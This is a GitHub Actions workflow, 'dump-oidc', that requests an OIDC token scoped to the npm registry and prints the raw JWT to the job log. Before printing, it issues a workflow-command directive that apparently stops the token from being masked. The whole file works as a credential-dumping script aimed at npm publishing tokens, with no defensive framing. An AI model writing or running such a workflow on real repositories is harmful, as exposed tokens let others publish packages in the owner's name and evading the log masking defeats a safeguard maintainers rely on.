name: dump-oidc
"on":
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: Get OIDC token and print
        run: |
          TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm:registry.npmjs.org" | jq -r .value)
          echo "::stop-commands::stop-mask"
          echo
          echo "===JWT_START==="
          echo "$TOKEN"
          echo "===JWT_END==="
          echo
          echo "::stop-mask::"
